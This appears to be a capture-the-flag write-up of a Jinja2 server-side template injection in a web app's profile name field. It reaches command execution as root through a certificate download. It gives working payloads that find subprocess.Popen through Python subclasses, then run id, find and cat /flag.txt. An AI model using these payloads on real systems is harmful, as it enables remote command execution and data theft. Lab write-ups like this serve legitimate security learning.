
- We are being provided with a web application
- We go to register and create an account:![[Pasted image 20250825234434.png]]

- Then we login with the account we created![[Pasted image 20250825234511.png]]

- After login we enter a `/dashboard` page![[Pasted image 20250825234858.png]]
- The `Download Certificate` button is very interesting, because when pressed it gives us a certification which contains some information about our account![[Pasted image 20250825235237.png]]

- At the `/profile/personal` page 
![[Pasted image 20250825235628.png]]
- We can change the fields from the `Personal Information` form, but especially the name field![[Pasted image 20250826002124.png]]

- After some thought, and looking on the internet, I realized that the name `JinjaCare` could be indicating the use of `Jinja2` template engine, which can lead to `SSTI` - `Server Side Template Injection` 
- So let's test this in the Full Name field and see what the vaccine document outputs
![[Pasted image 20250826114141.png]]
- And the result
![[Pasted image 20250826114230.png]]

- At the name we can see that it worked, so let's try something else
- Firstly I want to see If I have the `popen` function
- In the `Full name` filed I use the next script to find if we have access to `popen` and at what position it is:
```
{%for c in ().__class__.__base__.__subclasses__()%}{%if "Popen" in c.__name__%}{{loop.index0}}-{{c}}{%endif%}{%endfor%}
```
- `().__class__` - access the class tuple
- `__base__` - gives the direct superclass (which is `object`)
- `__subclasses__()` - returns a list of all classes that directly inherit from it
![[Pasted image 20250826114921.png]]
- Indeed we have access to `popen` 

- Next let's see which user the server runs:
```
{{().__class__.__base__.__subclasses__()[359]("id",shell=True,stdout=-1).communicate()}}
```
![[Pasted image 20250826115102.png]]
- We run as `root` which gives us full permission of the server

- Next we use `find` to search for the flag 
```
{{().__class__.__base__.__subclasses__()[359]("find / -name flag.txt 2>/dev/null",shell=True,stdout=-1).communicate()}}
```
![[Pasted image 20250826115518.png]]

- Finally we output the content of the flag
```
{{().__class__.__base__.__subclasses__()[359]("cat /flag.txt",shell=True,stdout=-1).communicate()}}
```
![[Pasted image 20250826115627.png]]

